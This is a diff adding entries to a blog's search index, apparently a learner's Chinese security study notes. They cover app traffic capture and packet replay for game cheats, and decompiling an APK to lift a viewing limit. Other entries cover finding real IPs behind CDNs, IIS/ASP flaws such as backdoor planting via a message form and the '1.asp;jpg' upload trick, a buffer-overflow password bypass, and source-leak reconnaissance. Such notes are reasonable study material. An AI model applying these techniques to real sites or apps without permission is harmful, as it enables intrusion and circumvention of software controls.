class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> e=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mytitle&quot;</span>);</span><br><span class="line">e.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;blue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> color=<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;unit&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(color[<span class="number">0</span>]);<span class="comment">//&lt;input type=&quot;radio&quot; id=&quot;r1&quot; name=&quot;unit&quot;&gt;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(color[<span class="number">1</span>]);<span class="comment">//&lt;input type=&quot;radio&quot; id=&quot;r2&quot; name=&quot;unit&quot;&gt;</span></span><br><span class="line">color.<span class="title function_">forEach</span>(<span class="function"><span class="params">elem</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(elem.<span class="property">checked</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(elem.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231111111325343.png"></p>
+]]></content>
+      <categories>
+        <category>xss</category>
+        <category>js</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+        <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>app概述</title>
+    <url>/2023/10/30/app/</url>
+    <content><![CDATA[<h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><p>用过bp都知道，请求包有一个User-agent，此代表客户端浏览器信息；</p>
+<p>而当用手机浏览器和PC浏览器访问同一个内容时，会有所不同。</p>
+<p>手机一般是，跳转到 <code>m.example.com</code>，PC，跳转到 <code>example.com</code></p>
+<p>这个就是代码去判断UA，然后响应出相应的页面。</p>
+<p>对于渗透人员，bp毕竟是电脑上的，遇到app的站点，要将它显示到PC浏览器上嘞，直接访问吗？</p>
+<p>答：有可能会出错，一般不直接访问；正确做法是，bp捕捉到app的请求包，然后复制它的UA标识，在PC浏览器上利用该UA发送即可。</p>
+<p>那么基于这种情况，web方面不好渗透，就可以转战app，下面介绍app抓包工具</p>
+<h1 id="抓包工具"><a href="#抓包工具" class="headerlink" title="抓包工具"></a>抓包工具</h1><p><strong>web协议：</strong></p>
+<p><strong>Charles</strong>：每一次的功能点击，都会有所记录，可以看到app的整个结构；数但是数据包多了，需要人工筛选</p>
+<p><strong>Fiddle</strong>：app设置好代理(<strong>ip地址是内网哈</strong>)后，fiddle只用监听端口就好了，然后看看</p>
+<p><img src="/../../../Typora/img111/image-20231023113525949.png"></p>
+<p><strong>burpsuite</strong>：没得说</p>
+<p>小程序同理，电脑应用同理；当然啊，抓的都是web协议的包，http或https</p>
+<p><strong>其他协议</strong>怎么讲？</p>
+<p>wireshark用过吧，各种协议都欧克；还有一个叫<strong>科来</strong>的，一个界面美观，内容丰富的分析系统</p>
+<p><img src="/../../../Typora/img111/image-20231023123105924.png"></p>
+<h1 id="封包"><a href="#封包" class="headerlink" title="封包"></a>封包</h1><p>当我们需要对app或应用程序进行抓包时，它<strong>很少有web协议的情况</strong>，那么就需要用科来或者<strong>封包工具</strong></p>
+<p>拿个简单的例子，在游戏程序里，控制一个角色的移动，这个会话一般是TCP协议。</p>
+<p>好好好，我渗透是要拿网站的，我跟你搞这个？</p>
+<p>呐，已经找到这个会话了，那就知道ip了，只不过是这个自定义端口上，是TCP协议；那枚举端口嘛，端口上还有服务，展开来嘛。</p>
+<p><strong>抓包</strong>，我们说是 <strong>零散的</strong>，游戏的一个操作，会被拆分成若干个数据包；</p>
+<p><strong>封包</strong>，这个主要是针对游戏，通过WPE软件工具，选择要操作的进程，去截取该进程中的一段动作啊、记录等等。再通过 <strong>发送</strong> 功能，向服务器发送这一段 <strong>封包</strong>，达到该动作、记录的重复。外挂、游戏测试一般都会用到，还有反封包重发，暂时未学</p>
+<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><strong>老版步骤</strong></p>
+<p>将代理机器人apk(proxydroid)移植到模拟器中，本机有CCproxy，WPE工具</p>
+<p>原理： 流量经过apk-&gt;ccproxy-&gt;wpe监听cc进程 实现封包抓包</p>
+<p>首先在apk设置好代理，协议类型是Socks5，CCproxy监听，WPE选择CCproxy进程，开始；然后模拟器进入游戏，WPE这边就可以抓到包，去寻找一些<strong>发送的包</strong>，进行重复发送，看是否能得到效果</p>
+<p><strong>新版</strong></p>
+<p>就一个工具，集合了</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>抓包的目的是为了分析，可以修改请求包，查看响应包，了解整个发送-响应的流程</p>
+<p>抓包对象：web、app、小程序、应用软件</p>
+<p>抓包协议工具：http(s)工具3个；其它协议，wireshark&#x2F;科来</p>
+<p>封包与封包：抓包就是抓的零散的一个包；封包是抓的完成<strong>一个</strong>动作或记录的<strong>所有包</strong>。</p>
+<h1 id="app资源提取"><a href="#app资源提取" class="headerlink" title="app资源提取"></a>app资源提取</h1><p>上面的抓包，封包，都是拿的外在的东西(交互点)，内在(代码部分)用什么工具呢？</p>
+<p>内在的信息提取-&gt;<strong>用到AppInfoScanner脚本</strong></p>
+<p>xposed模块-&gt;脱壳</p>
+<p>脱壳后反编译-&gt;<strong>安卓修改大师</strong></p>
+<blockquote>
+<p>如果一个app，有会员观看次数限制为10，那 <strong>反编译</strong> 之后，去找到这个初始次数限制的值，修改为100，重新编译，打包(签名)，再看能否修改成功</p>
+<p>或者仅仅修改模拟器手机的 <strong>机型</strong>，可能会重置这个观看次数，相当于一个新设备</p>
+</blockquote>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>外在-&gt;抓包&#x2F;封包-&gt;对交互点测试</p>
+<blockquote>
+<p>资产收集-&gt;资源提取-&gt;ICO&#x2F;MD5&#x2F;HASH-&gt;用fofa等搜索</p>
+</blockquote>
+<p>内在-&gt;反编译-&gt;java代码-&gt;代码审计</p>
+<blockquote>
+<p>反编译-&gt;提取RES资源-&gt;fofa搜索</p>
+</blockquote>
+<h1 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a>安卓逆向</h1><p>安卓的漏洞点：</p>
+<blockquote>
+<p>1.APP客户端</p>
+<p>2.APP与服务器的交互点</p>
+</blockquote>
+<p>对于越权、支付、SQL注入等，需要经过大量篡改进行测试，但是由于通信数据包是加密的，所以需要借助<strong>安卓逆向</strong>解密，对通信数据包<strong>解密</strong></p>
+<p>你比如，bp上抓到了这个app请求，但是呢，数据是base64加密，你解密完了还是<strong>乱码</strong>，所以还是要在app将流量<strong>转发到bp之前就进行解密，</strong>这样bp获得的是解密完的正常数据</p>
+<p>难点在于，关键代码的定位，那就是反编译，把源代码下载下来，去进行搜索，但是比较麻烦</p>
+<p>如果是用了Frida的Hook.js，就可以使得在app某些弹窗出现的时候，hook弹窗可以定位关键代码</p>
+<h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><p>动态二进制插桩工具，可以去获取到安卓进程，解密app数据</p>
+]]></content>
+      <categories>
+        <category>app</category>
+      </categories>
+      <tags>
+        <tag>app</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CDN概述</title>
+    <url>/2023/10/19/CDN/</url>
+    <content><![CDATA[<h1 id="CDN概述"><a href="#CDN概述" class="headerlink" title="CDN概述"></a>CDN概述</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a><strong>引入</strong></h2><p>CDN，用来提高访问速度的，真猴与假猴的关系，这个就不赘述了。</p>
+<p>两大功能：内容存储，分发技术；</p>
+<p>传统的访问流程：</p>
+<blockquote>
+<p>用户访问域名-&gt;解析服务器IP-&gt;访问目标主机</p>
+</blockquote>
+<p>有CDN的访问流程</p>
+<blockquote>
+<p>用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机</p>
+</blockquote>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a><strong>配置</strong></h2><p>以阿里云为例</p>
+<p>输入:</p>
+<blockquote>
+<p>要加速的域名，</p>
+<p>要加速的地区(国内还是国外)，</p>
+<p>要加速的资源(图片文件，还是大文件下载)</p>
+</blockquote>
+<h2 id="判定标准"><a href="#判定标准" class="headerlink" title="判定标准"></a><strong>判定标准</strong></h2><p>nslookup，各地ping(有多个IP，即启用了CDN)</p>
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a><strong>绕过方法</strong></h2><p>1.CDN配置只加速了特定子域名</p>
+<blockquote>
+<p>比如<a href="http://www.example/">www.example</a>. com，那去访问abc.example. com，这个IP可能是真实IP</p>
+<p>比如超级ping发现<a href="http://www.example/">www.example</a>. com有很多ip，但example.com的ip都相同，可以考虑这个是真实ip</p>
+</blockquote>
+<p>2.如果都加速了，<strong>网站漏洞</strong>(敏感信息泄露)或<strong>历史DNS记录</strong>(没有使用CDN之前的ip一般是真实ip)</p>
+<blockquote>
+<p>你比如，可以访问phpinfo.php文件，有真实ip信息</p>
+<p>如果目标机有ssrf漏洞，就是加载远程图片，那可以在kali搭建一个httpserver，端口1234，在目标机访问kali机:1234，kali这边接收时，会看到目标机真实ip</p>
+</blockquote>
+<p>查询网站：</p>
+<blockquote>
+<p><a href="http://www.17ce.com/">http://www.17ce.com/</a> 多地ping</p>
+</blockquote>
+<p>3.国外请求</p>
+<p>配置时加速区域仅限国内了</p>
+<p>4.fofa等空间搜索引擎</p>
+<p>js文件、url或者http头部，可能显示出CDN配置时加速的资源，比如只加载了图片小文件，那就去大文件下载</p>
+<p>5.邮件系统</p>
+<p>对方主动发你邮件，应该可以找到真实IP，你比如注册的时候、密码重置的时候，<strong>验证邮件已发往你的邮箱</strong>，查看发送方的ip，配合<strong>网站备案信息</strong>进行确认</p>
+<p>可能透露了归属地，那就找那个归属地的ip，可能是真实ip</p>
+<p>7.以上都不起作用时，全网扫描FuckCDN工具</p>
+<h2 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a><strong>绑定</strong></h2><p>前面绕过的方法，是在干什么，找真实ip啊，有什么用，hosts文件域名绑定啊</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>漏洞是不会发生在CDN上的啊，它是一个虚构的节点，只是缓存了主机的内容，漏洞本身还是在服务器上；就算拿到了CDN的webshell，也会发现没有内容</p>
+]]></content>
+      <categories>
+        <category>CDN</category>
+      </categories>
+      <tags>
+        <tag>CDN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>语言安全</title>
+    <url>/2023/10/14/asp/</url>
+    <content><![CDATA[<h1 id="语言安全"><a href="#语言安全" class="headerlink" title="语言安全"></a>语言安全</h1><h2 id="1-asp-很少了"><a href="#1-asp-很少了" class="headerlink" title="1.asp(很少了)"></a>1.asp(很少了)</h2><p>常见组合方式：windows下，iis+asp+access(sqlserver)</p>
+<p>虚拟机2003，部署了一个powereasy2006，(启用父路径，设置默认文档)</p>
+<p>主机去访问</p>
+<p><img src="/../../../Typora/img111/image-20231024201610677.png"></p>
+<h3 id="mdb默认下载漏洞"><a href="#mdb默认下载漏洞" class="headerlink" title="mdb默认下载漏洞"></a>mdb默认下载漏洞</h3><p><code>http://192.168.1.124/Admin/Admin_Login.asp</code>，访问后台</p>
+<p>搜索默认密码，进入后台</p>
+<p>目标是针对数据库文件，access，一般后缀为mdb(下载，在网站目录下)，asp,asa</p>
+<p>如果知道数据库文件的位置，那么可以直接下载了，这里假设根据默认路径知道了</p>
+<p><img src="/../../../Typora/img111/image-20231024203138125.png" alt="下载mdb文件"></p>
+<p><img src="/../../../Typora/img111/image-20231024203256039.png"></p>
+<p>之所以会下载，是因为服务器设置时，没有对该后缀文件进行解析</p>
+<h3 id="asp后门"><a href="#asp后门" class="headerlink" title="asp后门"></a>asp后门</h3><p>同理，再去2003部署一个aspcms</p>
+<p><img src="/../../../Typora/img111/image-20231024204517209.png"></p>
+<p>访问默认的数据库路径</p>
+<p><code>http://192.168.1.124:81/data/data.asp</code></p>
+<p><img src="/../../../Typora/img111/image-20231024204817450.png"></p>
+<p>它这种就有一个问题，即使攻击者知道这是个数据库文件，但由于乱码，看不了；当然将这个文件后缀改为mdb，是可以打开看的；但它现在属于可解析的，无法下载</p>
+<p>所以攻击者就想着传递后门代码，连接</p>
+<blockquote>
+<p>因为数据库文件有很多表，包括登录表，留言记录表等，那攻击者想到的是将后门通过留言功能传递到服务器的数据库文件中去，进行连接</p>
+</blockquote>
+<p><img src="/../../../Typora/img111/image-20231024205232406.png" alt="这是一个写好的unicode加密的后门代码，密码为a"></p>
+<p>提交后，蚁剑连接</p>
+<p><img src="/../../../Typora/img111/image-20231024205438585.png"></p>
+<h3 id="iis短文件名猜解"><a href="#iis短文件名猜解" class="headerlink" title="iis短文件名猜解"></a>iis短文件名猜解</h3><p>这个就是说，对于存在的短文件名，会返回404，对于不存在的，会返回400</p>
+<blockquote>
+<p>短文件名只保留前六位的文件名+ ~+ 1.后缀名的前三位</p>
+</blockquote>
+<p>emmm复现时手工猜解全是404情况嘞，有点鸡肋</p>
+<p>可以用iis_shortname_Scan脚本爆破</p>
+<h3 id="iis文件上传漏洞"><a href="#iis文件上传漏洞" class="headerlink" title="iis文件上传漏洞"></a>iis文件上传漏洞</h3><p>就是有一个接收jpg文件的上传功能</p>
+<p>代码文件改成1.jpg，上传上去无法解析</p>
+<p>可以将代码写好，命名为 <code>1.asp;jpg</code></p>
+<p>或者有一个以 <code>.asp</code>后缀名的文件夹时，上传1.jpg，也会被解析成asp</p>
+<p><strong>WebDAV写入漏洞</strong></p>
+<p>WEB服务拓展开启了 WebDAV，且主程序勾选了 <strong>写入</strong></p>
+<p>还是用工具检测吧，IIS权限利用，PUT检测poc</p>
+]]></content>
+      <categories>
+        <category>语言安全</category>
+      </categories>
+      <tags>
+        <tag>asp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>加密编码</title>
+    <url>/2023/10/12/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1>]]></content>
+      <categories>
+        <category>加密编码</category>
+      </categories>
+      <tags>
+        <tag>加密编码</tag>
       </tags>
   </entry>
   <entry>
@@ -977,6 +1738,114 @@
       <tags>
         <tag>webshell</tag>
         <tag>GET/POST</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>程序设计</title>
+    <url>/2023/09/26/cxsj/</url>
+    <content><![CDATA[<h1 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h1><h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><p>我们说，攻防都是相对的，一个好的攻击者它是知道怎么进攻的，那它也懂怎么防；一个好的防守者它是懂防守的，它可以去进攻。找程序漏洞，可以，但还是要多探究一个为什么，当一个工具猴子又什么乐趣，“虽说码头薯条”，但要去当一个聪明的猴子才更有竞争力；知识，还是要知其然并知其所以然，为了更好地理解，还是先回顾程序设计。</p>
+<h1 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h1><p>什么是程序设计；</p>
+<p>程序是用某种语言写出的一些语句。</p>
+<p>人有人的语言，机器有机器的语言，<strong>机器语言</strong>，0101对吧，但是这样设计程序很复杂；<strong>汇编程序</strong>是一种机器语言翻译程序，汇编语言如mov，add，但是还是比较难；再来一个 <strong>编译程序</strong>去翻译 <strong>汇编语言</strong>，这种 <strong>高级语言</strong>比起 <strong>汇编语言</strong>更直观，比如C、C++</p>
+<p>中文都是有语法的，那C++这种语言自然有其语法。</p>
+<p>还有一种是<strong>伪代码</strong>，就是只体现出其逻辑，但是不能直接运行。</p>
+<p>所以总结起来就是，机器-&gt;汇编-&gt;高级语言(C、C++)；这其实是一种简化，由难-&gt;易，但本质上还是遵循底层语言的，计算机执行的还是机器语言。</p>
+<p><strong>控制结构</strong></p>
+<p>好，我们已经知道这种语言了。我们写作的时候，是不是将就倒叙、插叙手法，剪视频还将就蒙太奇呢，这种就是 <strong>顺序</strong>，我们不可能一直从头到尾讲，所以为了控制语句的执行顺序，就有了控制结构，<code>if..else；while/for</code>之类的</p>
+<p><strong>变量、运算符、函数</strong>，这些基本概念也都知道了吧</p>
+<p><strong>全局思想</strong>：主要是讲到反汇编的汇编语言部分，x86的寄存器啊，指令啊这种汇编知识；总之就是，C语言代码在发挥作用之前都是先编译成机器指令</p>
+<p>之后讲到了：</p>
+<blockquote>
+<p>字符串</p>
+<p>有符号、无符号类型</p>
+<p>指针；就传递内存块的开始地址</p>
+<p>强制类型转换；临时改变一个变量的数据类型的方法；它强大的地方还是在于和指针搭配的时候，每个指针都要求有一个数据类型的</p>
+<p>变量作用域；局部呢，还是全局</p>
+</blockquote>
+<p><strong>存储器分段</strong></p>
+<p>每一段都是一块专用存储区，这五个段就是(text，data，bss，heap，stack)，就是代码段、数据段、全局变量&#x2F;静态变量、堆，栈，程序运行的时候，哪部分会存入相应的段呢，这里就不记了</p>
+<p><strong>程序构建</strong></p>
+<blockquote>
+<p>文件访问；2 ways：文件描述符和文件流</p>
+<p>数据结构；线性表，链表。。。</p>
+<p>结构：一般指结构体，类啊，封装了很多变量</p>
+<p>函数指针</p>
+<p>伪随机数</p>
+</blockquote>
+<p><strong>总结</strong>：以上这些只是为了说明那么多构成，是为了确保程序是遵照某个规则的。但是呢，有些东西可以打破规则，就是漏洞。</p>
+<h1 id="0x02-漏洞篇"><a href="#0x02-漏洞篇" class="headerlink" title="0x02 漏洞篇"></a><strong>0x02</strong> 漏洞篇</h1><p>一般与内存破坏有关，控制目标程序的执行流程，欺骗程序去执行一段植入内存的恶意代码。我记得上学时工程逆向这门课有过演示</p>
+<h2 id="一、缓冲区溢出"><a href="#一、缓冲区溢出" class="headerlink" title="一、缓冲区溢出"></a>一、缓冲区溢出</h2><p>典型的例子就是，给某个变量分配的内存不够存完输入的数据，那当把10字节的数据输入，存给8字节的缓冲区，那不崩溃啦，而且还会造成数据覆盖。</p>
+<p>一般就是比如有一个exe文件，你打开，它要密码，你又不知道，那你逆向工具，改一下内容，使得溢出后，无需正确密码也可访问。</p>
+<h3 id="例子1-溢出原理"><a href="#例子1-溢出原理" class="headerlink" title="例子1-溢出原理"></a>例子1-溢出原理</h3><p><img src="/../../../Typora/img111/image-20231103112310738.png" alt="image-20231103112310738"></p>
+<p>这个直接运行的话，只能输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before:</span><br><span class="line">buffer_2 is at 000000000062FE00 and contains &#x27;two&#x27;</span><br><span class="line">buffer_1 is at 000000000062FE10 and contains &#x27;one&#x27;</span><br><span class="line">value is at 000000000062FE1C and 5 (0x00000005)</span><br></pre></td></tr></table></figure>
+
+<p>先输出成exe文件</p>
+<p><img src="/../../../Typora/img111/image-20231103112543045.png"></p>
+<p>咦，为什么这两个地址之间差的是16字节，而不是8字节；编译器的内存对齐吗？</p>
+<p>那，它实际上数组应该是8字节大小，但是，我输入了10字节的值，没有把buffer_1内容覆盖掉</p>
+<p>算了，这样搞的话，输入17字节的数据试试</p>
+<blockquote>
+<p>argv[]是存储命令行参数的</p>
+</blockquote>
+<p><img src="/../../../Typora/img111/image-20231103113928079.png"></p>
+<p>看，当命令行参数为17字节的时候，将这个值赋值给buffer_2，造成溢出，导致之后的buffer_1内容被占了</p>
+<p>呐，只要足够大，也把value的内容占据了</p>
+<p><img src="/../../../Typora/img111/image-20231103115046826.png" alt="image-20231103115046826"></p>
+<h3 id="例子2-绕过密码"><a href="#例子2-绕过密码" class="headerlink" title="例子2-绕过密码"></a>例子2-绕过密码</h3><p><strong>原理</strong></p>
+<p>数组越界后就有可能破坏栈中相邻变量的值</p>
+<p><img src="/../../../Typora/img111/image-20231103122355283.png" alt="image-20231103122355283"></p>
+<p>看主函数，它调用了密码检查函数，判断是否通过；两个密码二选一，即可通过</p>
+<p>生成exe文件后，尝试一下</p>
+<p><img src="/../../../Typora/img111/image-20231103122710069.png"></p>
+<p>然后，看看溢出会怎么样，输入30字节绕过了</p>
+<p><img src="/../../../Typora/img111/image-20231103122818036.png"></p>
+<p>调试下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\VS project\py\Debug&gt; gdb -q ./auth_overflow</span><br><span class="line">Reading symbols from ./auth_overflow...done.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231103123558438.png"></p>
+<p>list 1就可以了，一次十行，要看后续代码，回车就可以</p>
+<p>设置断点，第9行和第16行，并输入参数为那30字节的值</p>
+<p><img src="/../../../Typora/img111/image-20231103123705334.png"></p>
+<p>在执行到断点9的时候，password都还是未知数呢，而auth_flag也是空值，显示password_buffer之后的28个字节内容，auth_flag的值见红框处</p>
+<p>明显可以看到<strong>password_buffer的位置在auth_flag之前</strong></p>
+<p><a href="https://www.python100.com/html/P060WGT4H17P.html">gdb调试</a>处，<code>gdb x</code>命令</p>
+<p><img src="/../../../Typora/img111/image-20231103123955695.png" alt="image-20231103123955695"></p>
+<blockquote>
+<p>x&#x2F;x x表示显示十六进制数据</p>
+<p>x&#x2F;s s表示显示字符</p>
+<p>x&#x2F;16xw 是显示16个地址的的数据，16进制显示，w代表数据单位为单词</p>
+</blockquote>
+<p>接下来，执行到第二个断点处，auth_flag的值是0x39，十六进制转化为十进制的值是3*16+9&#x3D;57，ascii码值对应的字符为9</p>
+<blockquote>
+<p>数字0<del>9对应<em>的ASCII码</em>(十进制)为“48”</del>“<em>57</em>” </p>
+<p>大写字母A<del>Z对应的ASCII码(十进制)为“65”</del>“90” </p>
+<p>小写字母a<del>z对应的百ASCII码(十进制)为”97”</del>“122” </p>
+</blockquote>
+<p>password_buffer的值，溢出到了auth_flag中，看下图，<code>90</code></p>
+<p><img src="/../../../Typora/img111/image-20231103124624879.png" alt="image-20231103124624879"></p>
+<blockquote>
+<p>x&#x2F;4cb 4个地址的数据， c是字符，b代表字节byte</p>
+<p>x&#x2F;dw d十进制，w是单词，0x3039的十进制就是12345</p>
+</blockquote>
+<p>溢出后，check_这个函数的返回值就是12345，而不是0，所以判断通过；</p>
+<p><code>auth_flag</code>是执行控制点，它的内容被覆盖，导致绕过</p>
+<p><img src="/../../../Typora/img111/image-20231103130348549.png" alt="image-20231103130348549"></p>
+<p><strong>然后，看一下，如果把password_buffer和auth_flag的声明交换位置呢，看9行和10行处</strong></p>
+<p>这样的话，内存中，<strong>auth_flag的位置在password_buffer之前</strong>，那么password_buffer溢出，怎样也影响不了auth_flag；</p>
+<p><strong>！！！！！！！！但是，这里有问题，更改语句声明位置，内存位置不变</strong></p>
+<blockquote>
+<p>按理说，局部变量，存储在栈中，那么J和K，J先声明，那么J的地址高；否则K的地址高</p>
+</blockquote>
+<p>还是和编译器有关系咯？</p>
+<p><strong>按理说，如果内存位置上，auth_flag的位置在password_buffer之前，那么无论如何也不会溢出绕过的</strong></p>
+<h3 id="bash篇"><a href="#bash篇" class="headerlink" title="bash篇"></a>bash篇</h3><p>bash shell和Perl</p>
+<h2 id="二、其它段溢出"><a href="#二、其它段溢出" class="headerlink" title="二、其它段溢出"></a>二、其它段溢出</h2><h3 id="基于堆的溢出"><a href="#基于堆的溢出" class="headerlink" title="基于堆的溢出"></a>基于堆的溢出</h3><h3 id="函数指针的溢出"><a href="#函数指针的溢出" class="headerlink" title="函数指针的溢出"></a>函数指针的溢出</h3><h2 id="三、格式化字符串"><a href="#三、格式化字符串" class="headerlink" title="三、格式化字符串"></a>三、格式化字符串</h2><h1 id="0x03-网络"><a href="#0x03-网络" class="headerlink" title="0x03 网络"></a>0x03 网络</h1>]]></content>
+      <categories>
+        <category>《漏洞发掘艺术》</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -3007,15 +3876,121 @@
 </ul>
 <h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>medium的<a href="https://infosecwriteups.com/how-to-find-your-first-bug-motivation-and-tips-for-bug-bounty-hunting-5e7343066d0c">Anton</a></p>
 <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>以Weblogic为例</p>
-<h3 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h3><ul>
-<li>shodan</li>
+<h3 id="资产收集1"><a href="#资产收集1" class="headerlink" title="资产收集1"></a>资产收集1</h3><p><strong>资产</strong></p>
+<p>1.一个网站可以有多个应用程序(IIS部署时，要把子目录转化为应用程序的)</p>
+<blockquote>
+<p>即example.com 是网页A，</p>
+<p>example.com&#x2F;abc 程序B，</p>
+<p>example.com:1234 程序C</p>
+</blockquote>
+<p>喏，只要其中一个程序有bug，那就可以尝试了</p>
+<p>2.二级域名</p>
+<blockquote>
+<p>a.example.com</p>
+<p>b.example.com</p>
+</blockquote>
+<p>目标a网站我弄不了，我先看b</p>
+<p>3.第三方插件的漏洞安全，比如有phpmyadim，弱口令怎么办，默认密码怎么办</p>
+<p>4.服务器的多个应用 如ftp</p>
+<p><strong>阻碍</strong></p>
+<p>站库分离</p>
+<p>CDN：给你一个距离最近的节点(缓存了你想访问的内容)供你访问</p>
+<blockquote>
+<p>该服务本质是访问加速</p>
+<p>对就近节点的访问</p>
+<p>比如主站ip位置在A点，该ip呢，B点也有，C点也有，每个点的ip都一样，那它就没有CDN服务</p>
+<p>开CDN的话，会根据不同位置的请求解析到不同的节点(访问加速)上去，这样也减轻了主机的负担。</p>
+<p>CDN就是，就是孙悟空的猴毛，变化成了很多假孙悟空，它们遍布各地，确保用户就近访问，但是如果假猴被攻击，对真猴没影响</p>
+<p>超级ping找真实ip</p>
+</blockquote>
+<p>负载均衡：多个用户要访问同一个服务，一台服务器(主机)搞不定，多来几台服务器(备用机)，都有这种服务，缓解主机压力</p>
+<blockquote>
+<p>kali有个lbd工具，识别</p>
+<p>广域网负载均衡，原理是DNS轮询，访问一个域名时，同一个域名可以解析成多个ip地址上</p>
+<p>服务器负责均衡，用设备或者nginx、apache自带的负载均衡</p>
+<p>负载均衡设备通过转发把用户的请求发到真正的后端服务器</p>
+</blockquote>
+<p>WAF应用防火墙：软件防火墙(安全狗，D盾)</p>
+<blockquote>
+<p>Wafw00f工具识别防火墙</p>
+</blockquote>
+<p>主机防护防火墙：杀软</p>
+<h3 id="资产收集2"><a href="#资产收集2" class="headerlink" title="资产收集2"></a>资产收集2</h3><p><strong>web架构</strong>：开发语言&amp;中间件&amp;数据库&amp;系统</p>
+<blockquote>
+<p>常见组合推算即可；文件后缀看语言；返回数据包和端口扫描看中间件；</p>
+<p>TTL和大小写敏感判断系统</p>
+</blockquote>
+<p><strong>web源码</strong>：CMS开源</p>
+<p><strong>web域名</strong>：子域名&#x2F;反查域名&#x2F;旁注</p>
+<blockquote>
+<p>旁注：<strong>同服务器</strong>下的不同WEB应用查询技术</p>
+<p>比如对171.x.x.x 进行旁注</p>
+<p><a href="http://www.123">www.123</a> .com 是目标，没头绪</p>
+<p>看下面的</p>
+<p><a href="http://www.456">www.456</a>. com</p>
+<p><a href="http://www.993">www.993</a>. com</p>
+<p>总结，<strong>该ip下面有三个站点</strong></p>
+</blockquote>
+<p><strong>cms识别不到时</strong>，采用方法如下：</p>
+<blockquote>
+<p><strong>.git源码泄露：</strong> Git，一个开源的分布式版本控制系统，比如写博客的时候，用git帮忙进行push，git初始化的时候会在当前目录创建一个 <code>.git</code>目录，记录代码的变更记录；发布代码时，要记得删除该目录，否则会被攻击者利用</p>
+<blockquote>
+<p>当url访问 &#x2F;.git&#x2F;目录，出现403时，说明存在，那利用脚本文件还是可以实现下载的</p>
+</blockquote>
+<p><strong>.svn源码泄露</strong>：同.git</p>
+<blockquote>
+<p>&#x2F;.svn&#x2F;entries ，脚本文件可进行下载</p>
+</blockquote>
+<p><strong>DS_Store文件泄露</strong>： Mac下Finder保存展示文件&#x2F;文件夹的数据文件</p>
+<blockquote>
+<p>&#x2F;.DS_Store，脚本文件进行下载</p>
+</blockquote>
+<p><strong>Composer.json泄露</strong>：有网站框架信息，cms信息等</p>
+<blockquote>
+<p>&#x2F;composer.json  </p>
+</blockquote>
+<p><strong>WEB-INF泄露</strong>：java的WEB应用的安全目录，必须通过web.xml文件对要访问的文件进行映射才能访问(这个一般是CTF了)</p>
+<blockquote>
+<p>WEB-INF&#x2F;web.xml，Web应用程序配置文件</p>
+<p>WEB-INF&#x2F;classes&#x2F;:存放Java类文件</p>
+<p>WEB-INF&#x2F;src&#x2F;：存放源代码</p>
+<p>通过web.xml，找到class文件的路径，找到class文件，反编译class文件，得到网站源码</p>
+</blockquote>
+</blockquote>
+<p><strong>github语法搜索</strong></p>
+<p><strong>google语法搜索</strong></p>
+<p><strong>f12，代码的注释信息</strong></p>
+<p><strong>网络架构</strong>：外网搭建、内网搭建</p>
+<blockquote>
+<p>有时对一个公网ip怎么扫端口，都无法扫到，但可以访问其服务；考虑是该服务器做了反向代理，用内网搭建，但是端口转发到了外网。所以扫外网没用</p>
+</blockquote>
+<p><strong>内网资产：</strong>C段扫描</p>
+<blockquote>
+<p><strong>同网段</strong>下的不同服务器IP下的WEB应用查询技术</p>
+<p>171.x.x.x</p>
+<p><a href="http://www.123">www.123</a>. com或其它应用无头绪</p>
+<p>看171.x.x.1-255涉及的所有协议服务</p>
+<p>总结，<strong>该网段下的多个ip</strong></p>
+</blockquote>
